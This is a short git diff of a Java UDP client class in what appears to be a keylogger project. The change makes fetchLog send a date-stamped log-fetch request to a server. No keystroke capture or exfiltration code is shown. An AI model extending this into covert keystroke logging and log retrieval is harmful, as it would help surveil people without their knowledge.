@@ -6,10 +6,14 @@ import java.net.DatagramSocket;
 import java.net.InetAddress;
 import java.net.SocketException;
 import java.net.UnknownHostException;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
 
+import javax.swing.text.SimpleAttributeSet;
+
 import com.hao.keylogger.models.Log;
+import com.hao.keylogger.models.Resource;
 
 public class UDPClientHelper {
 	public enum RequestCommand {
@@ -87,8 +91,8 @@ public class UDPClientHelper {
 	 */
 	public void fetchLog(Date date) {
 		// TODO get from server, convert to Log object, pass to controller
-		//log.setContent(date.toString());
-		String msg = "Hi server";
+		String dateStr = new SimpleDateFormat("dd-MM-yyyy").format(date);
+		String msg = Resource.FETCH_LOG_REQUEST + "?" + dateStr;
 		DatagramPacket outPacket = new DatagramPacket(msg.getBytes(), msg.length(), address, port);
 		try {
 			socket.send(outPacket);
